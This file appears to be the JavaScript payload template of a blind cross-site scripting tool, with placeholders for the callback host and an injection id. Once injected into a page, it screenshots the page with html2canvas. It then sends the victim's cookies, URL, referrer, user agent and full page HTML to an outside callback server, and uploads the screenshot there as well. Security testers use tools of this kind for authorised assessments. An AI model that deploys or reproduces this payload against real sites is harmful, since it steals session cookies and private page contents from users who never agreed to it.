
var jQueryScriptOutputted = false;
function initJQuery() {
    
    //if the jQuery object isn't available
    if (typeof(jQuery) == 'undefined') {
    
        if (! jQueryScriptOutputted) {
            jQueryScriptOutputted = true;
            document.write('<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>');
            
        }
        setTimeout("initJQuery()", 50);
    } else {
                        
        $(function() {  
            //invocation
            $(document).ready(pic);
        });
    }
            
}
initJQuery();

document.write('<script type="text/javascript" src="{{callback_protocol}}://{{hostname}}/assets/html2canvas.js"></script>');
//Base64 binary utility
var Base64Binary = {
    _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

    /* will return a  Uint8Array type */
    decodeArrayBuffer: function(input) {
        var bytes = (input.length/4) * 3;
        var ab = new ArrayBuffer(bytes);
        this.decode(input, ab);

        return ab;
    },

    decode: function(input, arrayBuffer) {
                //get last chars to see if are valid
                var lkey1 = this._keyStr.indexOf(input.charAt(input.length-1));
                var lkey2 = this._keyStr.indexOf(input.charAt(input.length-2));

                var bytes = (input.length/4) * 3;
                if (lkey1 == 64) bytes--; //padding chars, so skip
                if (lkey2 == 64) bytes--; //padding chars, so skip

                var uarray;
                var chr1, chr2, chr3;
                var enc1, enc2, enc3, enc4;
                var i = 0;
                var j = 0;

                if (arrayBuffer)
                    uarray = new Uint8Array(arrayBuffer);
                else
                    uarray = new Uint8Array(bytes);

                input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

                for (i=0; i<bytes; i+=3) {
                        //get the 3 octects in 4 ascii chars
                        enc1 = this._keyStr.indexOf(input.charAt(j++));
                        enc2 = this._keyStr.indexOf(input.charAt(j++));
                        enc3 = this._keyStr.indexOf(input.charAt(j++));
                        enc4 = this._keyStr.indexOf(input.charAt(j++));

                        chr1 = (enc1 << 2) | (enc2 >> 4);
                        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                        chr3 = ((enc3 & 3) << 6) | enc4;

                        uarray[i] = chr1;
                        if (enc3 != 64) uarray[i+1] = chr2;
                        if (enc4 != 64) uarray[i+2] = chr3;
                    }

                    return uarray;
                }
            }

    // Wait for page to render
   

    var screenshot_id = new Date().getTime();

    function tester(){
        alert('inhere');
    }
    // Render Canvas Object
    function pic() {
    if (document.documentElement.outerHTML.length > 65535)
    {
        var width_len = 1900;
        var height_len = 1200;
    } else {
        var width_len = null;
        var height_len = null;
    }
      html2canvas(document.body, {
        onrendered: function (canvas) {
          var screenshot = canvas.toDataURL('image/png');
          var user_agent = navigator.userAgent;
          var uri = document.URL;
          var referrer = document.referrer;
          var cookies = document.cookie;
          var dom = document.documentElement.outerHTML;
          var xss_uid = {{xss_uid}};
            $.ajax({
                type: "POST",
                url: "{{callback_protocol}}://{{hostname}}/callbacks",
                data: {
                  uri: uri,
                  screenshot: screenshot_id,
                  xss_uid: xss_uid,
                  referrer: referrer,
                  cookies: cookies,
                  user_agent: user_agent,
                  dom: dom
              }
          }).done(function (respond) {
            console.log(respond);
        });

    // Set JS prototype for Binary uploads
    if ( XMLHttpRequest.prototype.sendAsBinary === undefined ) {
        XMLHttpRequest.prototype.sendAsBinary = function(string) {
            var bytes = Array.prototype.map.call(string, function(c) {
                return c.charCodeAt(0) & 0xff;
            });
            this.send(new Uint8Array(bytes).buffer);
        };
    }

    // Prepare image for upload
    var encodedPng = screenshot.substring(screenshot.indexOf(',')+1,screenshot.length);
    var decodedPng = Base64Binary.decode(encodedPng);
    var boundary = '----ThisIsDeadBeef1234567890';

    // let's encode our image file, which is contained in the var
    var formData = '--' + boundary + '\r\n'
    formData += 'Content-Disposition: form-data; name="file"; filename="' + screenshot_id + '.png' + '"\r\n';
    formData += 'Content-Type: ' + "image/png" + '\r\n\r\n';
    for ( var i = 0; i < decodedPng.length; ++i )
    {
        formData += String.fromCharCode( decodedPng[ i ] & 0xff );
    }
    formData += '\r\n';
    formData += '--' + boundary + '--\r\n';

    var xhr = new XMLHttpRequest();
    xhr.open( 'POST', '{{callback_protocol}}://{{hostname}}/up', true );
    xhr.onload = xhr.onerror = function() {
        console.log( xhr.responseText );
    };
    xhr.setRequestHeader( "Content-Type", "multipart/form-data; boundary=" + boundary );
    xhr.sendAsBinary( formData );
    console.log('success');
},
width: width_len,
height: height_len
});
}
